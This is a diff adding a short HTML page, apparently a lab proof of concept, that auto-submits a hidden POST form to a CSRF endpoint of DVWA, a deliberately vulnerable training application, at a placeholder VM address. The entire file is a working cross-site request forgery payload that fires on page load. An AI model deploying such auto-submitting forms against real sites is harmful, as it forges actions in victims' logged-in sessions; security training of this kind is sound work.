@@ -1,0 +1,11 @@
+<!doctype html> 
+<html> 
+  <body> 
+    <form id="csrf" 
+    action="http://<vm-ip>/dvwa/vulnerabilities/csrf/csrf-vulnerable.php" 
+    method="POST"> 
+      <input type="hidden" name="level" value="high"> 
+    </form> 
+    <script>document.getElementById('csrf').submit();</script> 
+  </body> 
+</html>
